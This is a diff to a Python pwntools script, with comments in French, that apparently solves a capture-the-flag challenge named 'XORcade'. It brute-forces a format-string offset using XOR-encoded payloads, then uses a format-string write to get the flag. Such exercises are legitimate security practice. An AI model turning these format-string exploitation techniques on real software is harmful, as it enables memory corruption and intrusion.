@@ -8,14 +8,14 @@ def xor(data, key):
 
 
 def find_offset(binary_path: str) -> int | None:
-    for i in range(100):
+    for i in range(50):
         io = process(binary_path)
         # Formatte et XOR le payload
-        payload = b"AAAB%" + str(i).encode() + b"$x"
+        payload = f"AAAA %{i}$x".encode()
         xor_payload = xor(payload, KEY)
         io.sendline(xor_payload)
         # Lis la sortie du binaire
-        if b"414141" in io.recvall():
+        if b"4141" in io.recvall():
             return i  # Offset trouvé
 
     raise ValueError("Offset non trouvé.")
@@ -50,5 +50,6 @@ def string_format_bug(binary_path: str, offset: int, value: int) -> str:
 if __name__ == "__main__":
     binary_path = "./XORcade"
     offset = find_offset(binary_path)
+    print(f"Offset: {offset}")
     flag = string_format_bug(binary_path, offset, value=0x3C548A98)
     print(f"Flag: {flag}")
